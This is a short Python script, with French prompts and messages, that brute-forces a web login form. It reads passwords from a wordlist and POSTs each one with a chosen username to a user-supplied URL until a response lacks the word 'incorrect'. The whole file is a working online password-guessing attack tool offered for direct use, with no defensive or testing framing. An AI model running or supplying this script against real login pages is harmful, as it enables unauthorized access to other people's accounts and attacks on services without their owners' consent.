import requests

def bruteforce_https(url, username, wordlist_path):
    with open(wordlist_path, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "incorrect" not in response.text.lower():
            print(f"[+] Mot de passe trouvé : {password}")
            return password
        else:
            print(f"[-] Échec avec : {password}")
    
    print("[-] Aucun mot de passe trouvé.")
    return None

# Utilisation
url = input("🔗 URL du formulaire de login : ")
username = input("👤 Nom d'utilisateur : ")
wordlist_path = input("📄 Chemin de la wordlist : ")
bruteforce_https(url, username, wordlist_path)
